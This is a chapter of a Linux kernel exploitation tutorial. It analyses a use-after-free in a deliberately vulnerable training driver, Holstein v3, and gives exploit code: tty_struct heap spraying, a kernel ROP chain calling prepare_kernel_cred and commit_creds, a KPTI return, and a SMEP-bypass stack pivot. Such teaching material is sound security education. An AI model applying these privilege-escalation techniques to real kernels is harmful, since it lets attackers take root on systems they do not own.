---
title: "Holstein v3: Exploiting Use-after-Free"
tags:
    - [Linux]
    - [Kernel]
    - [Use-after-Free]
lang: en
permalink: /en/linux-kernel/LK01/use_after_free.html
pagination: true
bk: heap_overflow.html
fd: race_condition.html
---
In the previous chapter we escalated privileges by exploiting a heap overflow in the Holstein module. Once again, the author of Holstein patched the vulnerability and released Holstein v3. In this chapter we will exploit the improved Holstein v3 module.

## Analyzing the patch and investigating the vulnerability
First, download [Holstein v3](distfiles/LK01-3.tar.gz).

There are two main differences from v2. First, `open` now uses `kzalloc` when allocating the buffer.
```c
  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }
```
Like `kmalloc`, `kzalloc` allocates memory from the kernel heap, but it also zero-fills the allocation afterward. In other words, `kzalloc` plays a role similar to `calloc` in userland.

Second, `read` and `write` now include size checks to stop heap overflows.
```c
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```
So, in this version of the module, we can no longer trigger a heap overflow.

Now look at the implementation of `close`.
```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}
```
The buffer is freed with `kfree` once it is no longer needed, but the pointer remains stored in `g_buf`. If we could still access `g_buf` after `close`, we would have a use-after-free.

Some readers may think: "But once you call `close`, you can no longer `read` or `write` through that file descriptor, so a use-after-free should not happen." That is true for a single descriptor, but this is where it helps to remember how kernel code behaves.

Inside the kernel, the same resource may be shared by multiple programs. The Holstein module is not limited to a single `open`; multiple programs, or even one program, can call `open` multiple times. What happens if we use it like this?
```c
int fd1 = open("/dev/holstein", O_RDWR);
int fd2 = open("/dev/holstein", O_RDWR);
close(fd1);
write(fd2, "Hello", 5);
```
The first `open` allocates `g_buf`, but the second `open` replaces `g_buf` with a new buffer. The old one is left allocated, causing a memory leak. Next, `close(fd1)` frees `g_buf`. At that point `fd1` is dead, but `fd2` is still valid, so we can still read from and write to the freed `g_buf`. That gives us a use-after-free.

This is a good example of why kernel code must be designed with **shared resources across multiple callers** in mind. If you forget that property, it is very easy to introduce vulnerabilities.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="Wolf" ></div>
  <p class="says">
    If `close` cleared the pointer to `NULL`, or if `open` failed whenever `g_buf` was already allocated, this particular bug would have been much harder to introduce.<br>
    Whether that is really enough is something we will revisit in the next chapter.
  </p>
</div>

## Bypassing KASLR
As a first step, let's leak the kernel base address and the address of `g_buf`.
Even though the bug is now a use-after-free instead of a heap overflow, the buffer size is still `0x400`, so `tty_struct` is still useful.

## Building kROP
At this point we can already do ROP. We only need to prepare a fake `tty_operations` and pivot the stack into a ROP chain.

However, unlike the previous chapter, we are dealing with a use-after-free, so the memory we can currently control overlaps with a `tty_struct`. Naturally, when we use `tty_operations` through `ioctl` and similar paths, the `tty_struct` contains many fields that are not directly referenced. In principle, some of those bytes could be reused to store both the ROP chain and the fake `tty_operations`.

That said, massively corrupting the structure we are about to use for exploitation can create unintended instability later on, and it may also severely limit the size and layout of the ROP chain. It is better to allocate the `tty_struct` and the actual ROP chain in separate regions if possible.

So this time we trigger a second use-after-free. Since there is only one `g_buf`, we first write the ROP chain and fake `tty_operations` into the current `g_buf`, whose address we already know. Then we trigger another use-after-free elsewhere and overwrite the function table of that second `tty_struct`. This way we only replace the function table pointer in the live `tty_struct`, which gives us a more stable exploit.
```c
  // ROP chain
  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // Fake tty_operations
  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

  write(fd2, buf, 0x400);

  // Second use-after-free
  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // Overwrite the function table pointer
  read(fd4, buf, 0x400);
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd4, buf, 0x20);

  // Control RIP
  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }
```

If privileges were escalated, the exploit succeeded. You can download the full exploit from [here](exploit/uaf-krop.c).

<center>
  <img src="img/uaf_privesc.png" alt="Privilege escalation through UAF" style="width:320px;">
</center>

This is why heap overflows and use-after-free bugs are often easier to exploit in kernel space than the same bug classes in userland. The kernel heap is shared, and there are many useful objects with function pointers and other sensitive fields that can be repurposed during exploitation.

The flip side is also important: if you cannot find a useful target structure in the same size class as the vulnerable object, exploitation becomes much harder.

## Bonus: RIP control and bypassing SMEP
In this chapter we bypassed all the relevant mitigations.
As mentioned briefly in the previous chapter, there is another simple trick when SMAP is disabled but SMEP is enabled. Suppose you already gained RIP control and can call a gadget like this:
```
0xffffffff81516264: mov esp, 0x39000000; ret;
```
If you `mmap` user memory at `0x39000000` in advance and place your ROP chain there, this gadget will pivot the stack into that userland ROP chain. In that case you do not need to store the ROP chain inside kernel memory or leak the address of a kernel heap region first.

One caveat is that `RSP` should end up aligned to an 8-byte boundary. Otherwise, if the kernel executes an instruction that requires aligned stack state, the exploit may crash.

Also, functions such as `commit_creds` and `prepare_kernel_cred` consume some stack space, so in practice you should map slightly below `0x39000000` and leave some room. A margin of around `0x8000` bytes is usually enough.

Try disabling SMAP and escalating privileges by pivoting into a userland ROP chain with such a gadget. When `mmap`ing the pivot target, add the `MAP_POPULATE` flag. That forces physical memory to be populated so that the mapping remains visible from the kernel even when KPTI is enabled.

[^1]: This appears again in a later chapter, but when the JIT for eBPF is enabled, gaining RIP control in the kernel very often leads to a practical privilege-escalation exploit.

---

<div class="column" title="Exercise 1">
  Try escalating privileges without ROP, for example by overwriting <code>modprobe_path</code> or fields inside a <code>cred</code> structure.<br>
</div>
